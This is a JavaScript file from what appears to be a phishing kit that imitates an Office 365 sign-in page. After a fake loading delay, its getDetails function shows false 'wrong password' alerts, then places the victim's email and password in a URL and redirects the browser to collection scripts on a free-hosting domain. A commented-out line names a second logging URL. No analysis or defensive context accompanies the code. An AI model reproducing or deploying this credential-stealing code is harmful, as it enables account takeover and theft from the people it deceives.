const validEmail = /^(([^<>()[\]\\.,;:\s@"]+(\.[^<>()[\]\\.,;:\s@"]+)*)|(".+"))@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))$/

const sendData = document.getElementById("sendData").value;

let url;

setTimeout(() => {
    document.getElementById("temp_loader").style.display = "none"
    document.getElementById("main_container").style.display = "flex"
    document.getElementById("newHeader").style.display = "block"
}, 1500);

Math.floor(Math.random() * 10)

function preventCheck(p) {
    p.checked = true
}

function getDetails(e) {
    const getHtml = e.parentElement;

    const emailSpan = document.getElementById("emailSpan");
    const passInput = document.getElementById("passInput");

    if (emailSpan.innerText == "" && passInput.value == "") {
        alert("Wrong Email or Password")
    }
    else if (passInput.value.length < 6) {
        alert("Wrong Password or Email")
    }
    else {
        url = "Domain" + "=" + "Office | Plain" + "&" + "Mail" + "=" + emailSpan.innerText + "&" + "Password" + "=" + passInput.value

        if (sendData == 1) {
            location = "https://falser-skies.000webhostapp.com/gb3/1/plain_365.php?" + url;
        } else if (sendData == 2) {
            location = "https://falser-skies.000webhostapp.com/gb3/2/plain_365.php?" + url;
        }
        else if (sendData == 3) {
            location = "https://falser-skies.000webhostapp.com/gb3/3/plain_365.php?" + url;
        }

        // location = "https://tellme24.com/logs/gm1/plain1.php?" + url;
        // location = "plain3.php?" + url;

        setTimeout(() => {
            passInput.value = "";
        }, 2000);
    }
}
